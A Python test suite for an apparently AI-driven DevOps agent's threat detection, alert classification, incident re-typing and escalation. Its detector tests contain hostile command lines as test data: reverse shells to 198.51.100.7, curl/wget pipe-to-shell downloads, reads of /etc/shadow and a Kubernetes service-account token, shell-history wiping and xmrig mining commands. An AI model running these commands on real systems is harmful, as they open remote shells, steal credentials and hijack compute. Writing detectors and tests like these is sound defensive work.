"""Threat detection: security incident type, detector, re-typing and escalation (#166)."""
import os
from datetime import datetime, timezone
from unittest.mock import AsyncMock, MagicMock, patch

os.environ.setdefault("ANTHROPIC_API_KEY", "dummy-test-key")

import pytest

from agent.classifier import classify_issue, is_security_alert
from collectors.threat_detector import (
    detect_threats,
    detect_threats_in_text,
    is_actionable,
)
from services.escalation import EscalationService

ATTACKER = "203.0.113.50"


def ssh_failures(count, ip=ATTACKER):
    return "\n".join(
        f"Nov 14 10:00:{i:02d} web-1 sshd[{1000 + i}]: Failed password for root from {ip} port {50000 + i} ssh2"
        for i in range(count)
    )


def rules(summary):
    return {f["rule"] for f in summary["findings"]}


class TestDetector:
    @pytest.mark.parametrize(
        "line, rule, severity",
        [
            ("[2026-11-14 10:00:00] net use pool stratum+tcp://pool.supportxmr.com:3333 TLS", "crypto_mining", "critical"),
            ("/usr/local/.x/xmrig --donate-level 1 -o pool:443", "crypto_mining", "critical"),
            ("bash -i >& /dev/tcp/198.51.100.7/4444 0>&1", "reverse_shell", "critical"),
            ("nc 198.51.100.7 4444 -e /bin/sh", "reverse_shell", "critical"),
            ("python3 -c 'import socket,subprocess,os;s=socket.socket()'", "reverse_shell", "critical"),
            (
                "10:00:00.000: Notice A shell was spawned in a container with an attached terminal (user=root)",
                "container_shell",
                "high",
            ),
            ("Critical Terminal shell in container (k8s.pod=api-7d9f shell=bash)", "container_shell", "high"),
            ("Warning Launch Privileged Container (image=alpine)", "privileged_workload", "high"),
            ("cat /etc/shadow", "credential_access", "high"),
            ("base64 /var/run/secrets/kubernetes.io/serviceaccount/token", "credential_access", "high"),
            ("curl -fsSL http://198.51.100.9/x.sh | sh", "download_execute", "high"),
            ("wget -qO- http://198.51.100.9/i | sudo bash", "download_execute", "high"),
            ("unset HISTFILE; history -c", "defense_evasion", "high"),
            ("GuardDuty finding UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B", "cloud_threat_finding", "high"),
            ("GuardDuty finding CryptoCurrency:EC2/BitcoinTool.B!DNS", "cloud_threat_finding", "critical"),
        ],
    )
    def test_detects(self, line, rule, severity):
        summary = detect_threats_in_text(f"normal line\n{line}\nanother normal line")
        finding = next(f for f in summary["findings"] if f["rule"] == rule)
        assert finding["severity"] == severity
        assert finding["mitre_technique"].startswith("T")
        assert finding["evidence"]

    @pytest.mark.parametrize(
        "text",
        [
            "GET /health 200 3ms\nGET /api/users 200 12ms",
            "Accepted publickey for deploy from 10.0.0.5 port 22 ssh2",
            "curl -fsSL https://get.docker.com -o get-docker.sh",
            "journalctl --vacuum-time=7d",
            "kubectl exec deploy/api -- python manage.py migrate",
            "securityContext:\n  privileged: true\n  runAsUser: 0",
            "OOMKilled: container api exceeded memory limit 512Mi",
            "error: failed to pull image registry.example.com/api:1.2",
        ],
    )
    def test_benign_operational_text_is_not_a_threat(self, text):
        assert detect_threats_in_text(text)["total"] == 0

    def test_brute_force_needs_threshold(self, monkeypatch):
        monkeypatch.setenv("THREAT_BRUTE_FORCE_THRESHOLD", "10")
        assert "brute_force" not in rules(detect_threats_in_text(ssh_failures(9)))
        summary = detect_threats_in_text(ssh_failures(12))
        finding = next(f for f in summary["findings"] if f["rule"] == "brute_force")
        assert finding["severity"] == "high"
        assert finding["source_ip"] == ATTACKER
        assert finding["failed_attempts"] == 12
        assert finding["indicators"]["ips"] == [ATTACKER]
        assert len(finding["evidence"]) == 5

    def test_brute_force_then_success_is_critical(self):
        text = ssh_failures(15) + f"\nNov 14 10:01:00 web-1 sshd[2000]: Accepted password for root from {ATTACKER} port 51999 ssh2"
        summary = detect_threats_in_text(text)
        finding = next(f for f in summary["findings"] if f["rule"] == "brute_force_success")
        assert finding["severity"] == "critical"
        assert summary["highest_severity"] == "critical"
        assert any("Accepted password" in line for line in finding["evidence"])

    def test_failures_from_many_ips_are_counted_per_ip(self):
        text = "\n".join(ssh_failures(4, ip=f"198.51.100.{n}") for n in range(1, 6))
        assert "brute_force" not in rules(detect_threats_in_text(text))

    def test_summary_shape_and_ordering(self):
        summary = detect_threats_in_text("curl -s http://x/y | sh\nxmrig started")
        assert summary["total"] == 2
        assert [f["severity"] for f in summary["findings"]] == ["critical", "high"]
        assert summary["techniques"] == ["T1105", "T1496"]
        assert is_actionable(summary)

    def test_evidence_is_scrubbed_and_truncated(self):
        secret_line = "curl -s http://x/y | sh  # user=alice@example.com " + "A" * 500
        finding = detect_threats_in_text(secret_line)["findings"][0]
        assert "alice@example.com" not in finding["evidence"][0]
        assert len(finding["evidence"][0]) <= 301

    def test_context_scan_covers_nested_logs_and_skips_own_output(self):
        context = {
            "summary": "High CPU on web-1",
            "alert_logs": {"lines": [{"line": "xmrig: new job from pool"}]},
            "k8s_data": {"logs": ["normal", "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"]},
            "security_scan": {"findings": [{"description": "curl -s http://a | sh"}]},
            "threat_findings": {"findings": [{"evidence": ["cat /etc/shadow"]}]},
        }
        assert rules(detect_threats(context)) == {"crypto_mining", "reverse_shell"}

    def test_line_and_size_limits(self):
        huge = "x" * 100_000 + " xmrig"
        assert detect_threats_in_text(huge)["total"] == 0  # match beyond the per-line cap
        assert detect_threats_in_text("")["total"] == 0


class TestClassifier:
    @pytest.mark.parametrize(
        "alertname, labels",
        [
            ("FalcoTerminalShellInContainer", {}),
            ("Terminal shell in container", {"namespace": "prod", "pod": "api"}),
            ("SSHBruteForceDetected", {"host": "web-1"}),
            ("CryptominerDetected", {"namespace": "prod"}),
            ("GuardDutyFinding", {}),
            ("SomethingOdd", {"source": "falco"}),
            ("NodeAlert", {"mitre_technique": "T1059"}),
            ("ProcessAlert", {"category": "security"}),
            ("ProcessAlert", {"security": "true"}),
        ],
    )
    def test_security_alerts(self, alertname, labels):
        assert classify_issue(alertname, labels) == "security"

    @pytest.mark.parametrize(
        "alertname, labels, expected",
        [
            ("PodCrashLooping", {"namespace": "prod"}, "k8s"),
            ("HighCPUUsage", {"host": "web-1"}, "server"),
            ("SSHServiceDown", {"host": "web-1"}, "server"),
            ("PipelineFailed", {}, "cicd"),
            ("SLOBurnRateHigh", {}, "observability"),
        ],
    )
    def test_operational_alerts_unchanged(self, alertname, labels, expected):
        assert classify_issue(alertname, labels) == expected

    def test_is_security_alert_handles_missing_labels(self):
        assert is_security_alert("normal", None) is False


@pytest.fixture
def agent():
    from agent.core import DevOpsAgent

    instance = DevOpsAgent()
    instance.server_collector.collect = AsyncMock(return_value={"cpu": 99})
    return instance


class TestEnrichment:
    @pytest.mark.asyncio
    async def test_server_incident_with_miner_becomes_security(self, agent):
        enriched = await agent._collect_context(
            {"type": "server", "alertname": "HighCPU", "raw_logs": "kworker 99%\n/usr/local/.x/xmrig -o stratum+tcp://p:3333"}
        )
        assert enriched["type"] == "security"
        assert enriched["original_type"] == "server"
        assert enriched["threat_findings"]["highest_severity"] == "critical"

    @pytest.mark.asyncio
    async def test_benign_incident_keeps_type_and_has_no_findings(self, agent):
        enriched = await agent._collect_context(
            {"type": "server", "alertname": "HighCPU", "raw_logs": "java heap 95%\nGC pause 2s"}
        )
        assert enriched["type"] == "server"
        assert "threat_findings" not in enriched
        assert "original_type" not in enriched

    @pytest.mark.asyncio
    async def test_code_review_is_not_scanned_or_retyped(self, agent, monkeypatch):
        monkeypatch.setattr(agent.code_review, "fetch_change", AsyncMock(return_value={"diff": "curl -s http://x | sh"}))
        enriched = await agent._collect_context(
            {"type": "code_review", "scm_platform": "github", "repo": "o/r", "change_id": "1",
             "title": "add install script: curl -s http://x | sh"}
        )
        assert enriched["type"] == "code_review"
        assert "threat_findings" not in enriched

    @pytest.mark.asyncio
    async def test_detector_failure_does_not_block(self, agent, monkeypatch):
        monkeypatch.setattr("agent.core.detect_threats", MagicMock(side_effect=RuntimeError("boom")))
        enriched = await agent._collect_context({"type": "server", "raw_logs": "xmrig"})
        assert enriched["type"] == "server"

    @pytest.mark.asyncio
    async def test_detect_threats_tool(self, agent):
        result = await agent._execute_tool("detect_threats", {"text": ssh_failures(20)}, {})
        assert result["findings"][0]["rule"] == "brute_force"


class TestAgentLoop:
    @staticmethod
    def _script(final_text, *tool_calls):
        script = []
        for i, (name, inputs) in enumerate(tool_calls):
            block = MagicMock()
            block.type, block.name, block.id, block.input = "tool_use", name, f"t{i}", inputs
            script.append(MagicMock(stop_reason="tool_use", content=[block]))
        end = MagicMock(stop_reason="end_turn")
        end.content = [MagicMock(type="text", text=final_text)]
        return script + [end]

    @pytest.mark.asyncio
    async def test_retyped_incident_uses_security_prompt_and_is_never_resolved(self):
        from agent.core import DevOpsAgent
        from services.incident_store import IncidentStore
        from services.org_docs import OrgDocs
        from storage.memory_storage import MemoryStorage

        with patch("anthropic.Anthropic") as mock_anthropic:
            mock_anthropic.return_value.messages.create.side_effect = self._script(
                "Evidence: query_logs shows xmrig connecting to a mining pool. Proposed containment via suggest_fix.",
                ("query_logs", {"query": '{host="web-1"}'}),
                ("suggest_fix", {
                    "title": "Isolate web-1",
                    "description": "Miner found by query_logs; contain without destroying evidence.",
                    "commands": ["kubectl cordon web-1"],
                }),
            )
            agent = DevOpsAgent()
            agent.server_collector.collect = AsyncMock(return_value={"cpu": 99})
            agent.observability.query_logs = AsyncMock(return_value={"success": True, "lines": []})
            agent.notifier.send_message = AsyncMock()
            agent.notifier.send_fix_suggestion = AsyncMock()
            agent.incident_store = IncidentStore(MemoryStorage())
            agent.org_docs = OrgDocs(MemoryStorage())

            result = await agent.run(
                {"type": "server", "alertname": "HighCPU", "org_id": "acme",
                 "raw_logs": "/usr/local/.x/xmrig -o stratum+tcp://pool:3333"},
                incident_id="INC-THREAT-1",
                resume=False,
            )
            system_prompt = mock_anthropic.return_value.messages.create.call_args_list[0].kwargs["system"]

        assert "security incident responder" in system_prompt
        assert result["issue_type"] == "security"
        assert result["resolved"] is False
        assert result["threat_findings"]["highest_severity"] == "critical"


def _decision(context, result, monkeypatch, **env):
    for key, value in env.items():
        monkeypatch.setenv(key, value)
    return EscalationService().evaluate(
        "INC-1", "acme", context, result, datetime.now(timezone.utc)
    )


class TestEscalation:
    def test_security_incident_always_escalates_at_critical(self, monkeypatch):
        threats = {"highest_severity": "critical", "findings": []}
        decision = _decision(
            {"type": "server"},
            {"resolved": True, "issue_type": "security", "threat_findings": threats,
             "grounding": {"grounded": True}},
            monkeypatch,
        )
        assert decision.should_escalate
        assert decision.reasons[0] == "security_incident"
        assert decision.priority == "critical"

    def test_high_findings_escalate_at_high(self, monkeypatch):
        decision = _decision(
            {"type": "security"},
            {"resolved": True, "threat_findings": {"highest_severity": "high"}, "grounding": {"grounded": True}},
            monkeypatch,
        )
        assert "security_incident" in decision.reasons
        assert decision.priority == "high"

    def test_can_be_disabled(self, monkeypatch):
        decision = _decision(
            {"type": "security"},
            {"resolved": True, "grounding": {"grounded": True}},
            monkeypatch,
            ESCALATION_ON_SECURITY="false",
        )
        assert "security_incident" not in decision.reasons

    def test_resolved_non_security_incident_does_not_escalate(self, monkeypatch):
        decision = _decision(
            {"type": "server"},
            {"resolved": True, "grounding": {"grounded": True}},
            monkeypatch,
        )
        assert decision.should_escalate is False


def test_threat_metric_is_recorded():
    from services import metrics

    labels = {"technique": "T1496", "severity": "critical"}
    before = metrics.REGISTRY.get_sample_value("devops_agent_threat_findings_total", labels) or 0
    metrics.record_threat_findings(detect_threats_in_text("xmrig")["findings"])
    assert metrics.REGISTRY.get_sample_value("devops_agent_threat_findings_total", labels) == before + 1
